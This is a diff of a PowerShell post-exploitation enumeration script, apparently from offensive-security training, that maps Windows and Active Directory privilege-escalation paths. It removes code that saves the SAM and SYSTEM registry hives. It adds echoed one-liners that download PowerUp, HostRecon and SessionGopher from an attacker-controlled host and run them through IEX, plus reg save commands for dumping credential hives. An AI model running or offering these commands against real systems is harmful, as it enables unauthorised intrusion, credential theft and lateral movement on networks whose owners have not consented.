@@ -98,7 +98,10 @@ function Invoke-Enum{
         Copy-Item -Path z:\accesschk.exe -Destination c:\windows\tasks\accesschk.exe -Force
 
         Write-Output "[+] run accesschk"
-        c:\windows\tasks\accesschk.exe -accepteula -uwcqv "Authenticated Users" *
+        c:\windows\tasks\accesschk.exe -accepteula -uwcqv "Authenticated Users" *  | Out-String
+
+        # Write-Output "[+] checking for writable folders for $Env:Username"
+        # c:\windows\tasks\accesschk.exe -accepteula "$Env:Username" C:\windows -wus | Out-File "writable.txt"
     }
     catch
     {
@@ -223,7 +226,7 @@ function Invoke-Enum{
     try
     {
         Write-Output "[+] check for computers with constrained delegation"
-        Get-DomainComputer -TrustedToAuth
+        Get-DomainComputer -TrustedToAuth | Out-String
         Write-Output "[+] check for users with constrained delegation"
         Get-DomainUser -TrustedToAuth | Out-String
     }
@@ -283,32 +286,23 @@ function Invoke-Enum{
         Write-Output $PSItem.ToString()
     }
 
-    try
-    {
-        Write-Output "[+] attempting to dump registry"
-        reg save HKLM\sam C:\windows\tasks\sam.reg | Out-String
-        reg save HKLM\system C:\windows\tasks\system.reg | Out-String
-    }
-    catch
-    {
-        Write-Output $PSItem.ToString()
-    }
-
-
-    # Out-File -FilePath C:\\Tools\\test.txt
-    # Locate another directory in C:\Windows that could be used for this bypass.
-    # c:\Tools\SysinternalsSuite>icacls "c:\windows\system32\*" /t 2>nul | findstr "Authenticated"
-    # Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.ActiveDirectoryRights -Match "GenericWrite") {$_}}
 
     Write-Output "==========================================="
     Write-Output "[+] Did you:"
     Write-Output "`t[-] Check if you can impersonate anyone?"
-    whoami /priv | findstr Impersonate
+    whoami /priv | findstr Impersonate | Out-String
     Write-Output "`t[-] Sharphound.exe --ZipFileName file.zip --CollectionMethod All --Domain $env:UserDomain"
     Write-Output "`t[-] Check SID Filtering? netdom trust $env:UserDomain /domain: <DOMAIN 2> /quarantine"
+    Write-Output "`t[+] Some other enumeration scripts to try:"
+    Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/PowerUp.ps1') | IEX; Invoke-AllChecks"
     Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/HostRecon.ps1') | IEX; Invoke-HostRecon"
     Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/jaws-enum.ps1') | IEX"
     Write-Output "`t[-] (new-object system.net.webclient).downloadstring('http://$RemoteIP/SessionGopher.ps1') | IEX; Invoke-SessionGopher -Thorough"
+    Write-Output "`t[+] Can you dump the registry (not tried)?"
+    Write-Output "`t[-] reg save HKLM\sam sam.reg"
+    Write-Output "`t[-] reg save HKLM\system system.reg"
+    Write-Output "`t[^] TRY HARDER?"
+    Write-Output "`t[^] TRY HARDER?"
     Write-Output "`t[^] TRY HARDER?"
     Write-Output "==========================================="
 }
